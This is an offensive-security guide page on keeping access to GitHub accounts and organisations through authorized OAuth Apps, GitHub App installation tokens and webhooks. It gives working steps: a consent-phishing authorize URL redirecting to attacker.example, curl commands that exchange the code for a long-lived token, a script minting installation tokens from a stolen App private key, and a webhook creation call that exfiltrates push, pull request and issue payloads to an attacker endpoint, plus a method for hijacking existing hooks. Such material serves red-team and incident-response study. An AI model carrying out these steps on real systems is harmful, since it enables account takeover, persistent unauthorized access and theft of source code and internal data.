---
title: "OAuth App and webhook abuse: durable access through authorized apps and event exfiltration"
order: 4
description: "Persistence through authorized OAuth Apps, installed GitHub Apps and their installation access tokens, consent phishing an OAuth App with repo scope, and repo or org webhooks that exfiltrate push and event payloads to an attacker endpoint."
keywords:
  - OAuth App
  - GitHub App
  - installation access token
  - webhook
  - consent phishing
---

# OAuth App and webhook abuse

Passwords change and PATs get revoked, but **authorized apps and webhooks outlive both**. An OAuth App or GitHub App the victim has authorized keeps its grant until explicitly revoked, surviving password resets and even MFA enrollment. A webhook added to a repo or org quietly ships every matching event to a URL you control. Both are administrative-looking, which is why they are durable.

## Fingerprint the app and hook surface

With a session or a token carrying the right scope, list what is already authorized and what hooks exist:

```bash
# Apps the current user has authorized (OAuth) and installed (GitHub Apps)
gh api /user/installations -q '.installations[] | [.app_slug, .id] | @tsv'

# Existing webhooks on a repo / org (needs admin on the resource)
gh api /repos/ACME/service/hooks -q '.[] | [.id, .config.url, (.events|join(","))] | @tsv'
gh api /orgs/ACME/hooks -q '.[] | [.id, .config.url] | @tsv'
```

An org-level webhook is the highest-value hook: it sees events across every repo at once.

## Consent phishing an OAuth App

An OAuth App you register asks the victim to authorize scopes; GitHub's consent screen shows the app name and scopes but the victim clicks through. Request `repo` (and `read:org`) and the resulting user token reads and writes all their repos:

```
https://github.com/login/oauth/authorize?client_id=<your_client_id>&scope=repo%20read:org&redirect_uri=https://attacker.example/cb
```

The victim's browser returns a `code` to your `redirect_uri`; exchange it for a long-lived user access token:

```bash
curl -s -X POST https://github.com/login/oauth/access_token \
  -H 'Accept: application/json' \
  -d 'client_id=<id>&client_secret=<secret>&code=<code>&redirect_uri=https://attacker.example/cb'
# { "access_token": "gho_...", "scope": "repo,read:org", "token_type": "bearer" }
```

That `gho_` token behaves like the user for API purposes and persists until the authorization is revoked, independent of the victim's password or MFA.

## Installation access tokens from a GitHub App

A GitHub App authenticates as itself with a JWT signed by its private key, then mints a short-lived **installation access token** scoped to the repos where it is installed. If you obtain an App's private key and App ID (from a leaked secret, a CI variable, or a compromised App owner), you mint repo-scoped tokens at will:

```bash
# 1. Build an App JWT (RS256, signed with the App private key), valid ~10 min
JWT=$(python3 - <<'PY'
import jwt, time
key = open('app.pem').read()
print(jwt.encode({"iat": int(time.time())-60, "exp": int(time.time())+540, "iss": "123456"}, key, algorithm="RS256"))
PY
)
# 2. Find installations, then mint an installation token
curl -s -H "Authorization: Bearer $JWT" -H 'Accept: application/vnd.github+json' \
  https://api.github.com/app/installations -q
curl -s -X POST -H "Authorization: Bearer $JWT" \
  https://api.github.com/app/installations/<installation_id>/access_tokens
# { "token": "ghs_...", "expires_at": "...", "permissions": { "contents": "write", ... } }
```

The `ghs_` token carries whatever permissions the App installation was granted (often `contents: write`, `actions: write`), scoped to its repos, and renews from the key indefinitely, which is the persistence primitive.

## Webhook exfiltration

A webhook delivers a JSON payload for each subscribed event to its `config.url`. Add one pointing at your collector and you receive push contents, PR and issue bodies, and member events as they happen. Adding a hook requires admin on the repo or org:

```bash
curl -s -X POST -H "Authorization: token $TOKEN" \
  https://api.github.com/repos/ACME/service/hooks \
  -d '{
    "name": "web",
    "active": true,
    "events": ["push","pull_request","issues"],
    "config": { "url": "https://attacker.example/h", "content_type": "json", "secret": "s3cr3t" }
  }'
```

Push payloads include commit diffs and author emails; PR and issue payloads include bodies that frequently contain internal detail. The `secret` you set is the HMAC key GitHub signs deliveries with, so you can verify (and your collector trusts) the feed. Reading an **existing** hook's `config.secret` is not returned by the API, but you can overwrite it with a `PATCH` to take control of a hook already trusted by downstream automation.

## Follow-on

- OAuth/App token with `contents: write`: push backdoors and poisoned releases, see [token and GITHUB_TOKEN abuse](token-and-github-token-abuse.md).
- Installation token renewed from a stolen App key: durable, MFA-independent access that survives credential rotation.
- Org webhook feed: continuous intelligence on every repo (new secrets in pushes, personnel changes) feeding further [reconnaissance](reconnaissance.md).

## Exploitation notes

- Authorized OAuth Apps and installed GitHub Apps survive password reset and MFA enrollment; they are the quiet persistence most IR misses.
- A GitHub App private key is worth more than a PAT: it mints fresh installation tokens forever, scoped and short-lived enough to look routine.
- You cannot read an existing webhook secret, but you can `PATCH` it; overwriting a trusted hook's secret and URL hijacks an existing delivery channel.
- Org-level hooks beat repo hooks: one hook, every repo's events.

## Tools

- **gh api**: list, create, and patch hooks and installations directly.
- **PyJWT** / **ghtoken**: build the App JWT and mint installation access tokens from a private key.
- **smee.io** / any request bin: stand up a webhook collector to receive exfiltrated payloads.

## References

- [GitHub: authenticating as a GitHub App installation](https://docs.github.com/en/apps/creating-github-apps/authenticating-with-a-github-app/authenticating-as-a-github-app-installation)
- [GitHub REST API: repository webhooks](https://docs.github.com/en/rest/repos/webhooks)
- [GitHub: authorizing OAuth apps (web flow)](https://docs.github.com/en/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps)
- [Praetorian: GitHub App and OAuth token abuse for persistence](https://www.praetorian.com/blog/)
- [PayloadsAllTheThings: CI/CD and GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CI%20CD/README.md)
